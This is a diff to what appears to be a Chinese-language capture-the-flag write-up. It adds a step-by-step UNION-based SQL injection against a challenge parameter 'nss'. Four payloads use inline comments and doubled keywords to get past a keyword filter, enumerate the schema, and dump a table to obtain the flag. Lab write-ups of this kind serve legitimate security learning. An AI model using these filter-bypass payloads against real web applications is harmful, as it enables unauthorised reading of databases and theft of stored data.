@@ -49,4 +49,18 @@ nss=-1'/**/ununionion/**/select/**/1,2,3/**/limit/**/1,1#
 
 发生变化。
 
-于是开始逐步查询数据库、数据表以及
+于是开始逐步查询数据库、数据表以及对应的属性：
+
+```
+nss=-1'/**/ununionion/**/select/**/1,database(),(select/**/group_concat(schema_name)/**/from/**/infoorrmation_schema.schemata)/**/limit/**/1,1#
+
+nss=-1'/**/ununionion/**/select/**/1,database(),group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()/**/limit/**/1,1#
+
+nss=-1'/**/ununionion/**/select/**/1,database(),group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='NSS_tb'/**/limit/**/1,1#
+
+nss=-1'/**/ununionion/**/select/**/1,database(),group_concat(id,Secr3t,flll444g)/**/from/**/NSS_tb/**/limit/**/1,1#
+```
+
+![[Pasted image 20260927163458.png]]
+
+得到flag
